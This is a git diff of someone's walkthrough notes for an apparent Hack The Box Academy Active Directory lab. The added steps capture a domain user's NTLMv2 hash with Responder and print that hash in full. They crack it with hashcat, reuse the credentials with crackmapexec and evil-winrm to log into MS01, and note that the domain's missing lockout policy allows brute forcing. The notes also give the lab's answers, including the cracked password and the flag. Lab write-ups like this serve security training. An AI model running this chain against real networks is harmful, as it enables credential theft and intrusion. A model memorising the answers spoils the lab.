@@ -16,22 +16,31 @@ Question 1 - Obtain a password hash for a domain user account that can be levera
 5) lets set up proxychains early for this one lol -> log out of ssh and re-login with ssh -D 9050 htb-student@10.129.32.184
 6) good to go with proxychains. 
 7) inside of the SSH session run -> sudo responder -I ens224 and wait for some hashes 
+8) from output of responder we see hte user = AB920 
+9) for Hash go to cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt
+
+AB920::INLANEFREIGHT:052340f8c121128b:C8B1C93071EA544C7A3350D3CFC7B809:010100000000000000229CD0E77EDB0150906645905A397D00000000020008004A0037005700450001001E00570049004E002D00340034004C005500520045005600350047005400320004003400570049004E002D00340034004C00550052004500560035004700540032002E004A003700570045002E004C004F00430041004C00030014004A003700570045002E004C004F00430041004C00050014004A003700570045002E004C004F00430041004C000700080000229CD0E77EDB0106000400020000000800300030000000000000000000000000200000E9F1F96D0B3F6B2DA3B889C37A8CB7EEE5AC51BC722548E5052D7810D905A4630A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
+10) put hash in file on host machine 
+11) hashcat -m 5600 AB920 /usr/share/wordlists/rockyou.txt
+12) cracked - weasal
 
 
 
 
+Question 2 - What is this user's cleartext password? - weasal
+1) steps above
 
-Question 2 - What is this user's cleartext password?
-
-
-
-
-Question 3 -  Submit the contents of the C:\flag.txt file on MS01.
-
+Question 3 -  Submit the contents of the C:\flag.txt file on MS01. - aud1t_gr0up_m3mbersh1ps!
+1) ON SSH SESSION -> crackmapexec winrm 172.16.7.50 -u 'AB920' -p 'weasal' 
+2) we see we cau use evil winrm 
+3) ON SSH SESSION -> evil-winrm -i 172.16.7.50 -u AB920 -p weasal
+4) logged in as AB920 on MS01 -> cd C:\ -> type flag.txt - aud1t_gr0up_m3mbersh1ps!
 
 
 Question 4 - Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.
-
+1) run net accounts ON EVIL WINRM session
+2) we see theres no lockout threshold so we can brute force yo. 
+3) 
 
 
 Question 5 - What is this user's password?
